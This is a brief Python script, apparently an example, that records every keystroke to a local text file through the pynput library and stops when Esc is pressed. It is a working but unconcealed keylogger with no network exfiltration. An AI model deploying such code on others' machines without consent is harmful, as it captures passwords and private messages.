import pynput.keyboard as Keyboard

# Create a new text file
file = open('key_log.txt', 'w')

def on_press(key):
    # Callback function whenever a key is pressed
    try:
        print(f'Key {key.char} pressed!')
        # Write the key to the text file
        file.write(f'Key {key.char} pressed!\n')
    except AttributeError:
        print(f'Special Key {key} pressed!')
        # Write the special key to the text file
        file.write(f'Special Key {key} pressed!\n')

def on_release(key):
    print(f'Key {key} released')
    if key == Keyboard.Key.esc:
        # Stop the listener
        # Close the text file
        file.close()
        return False

with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()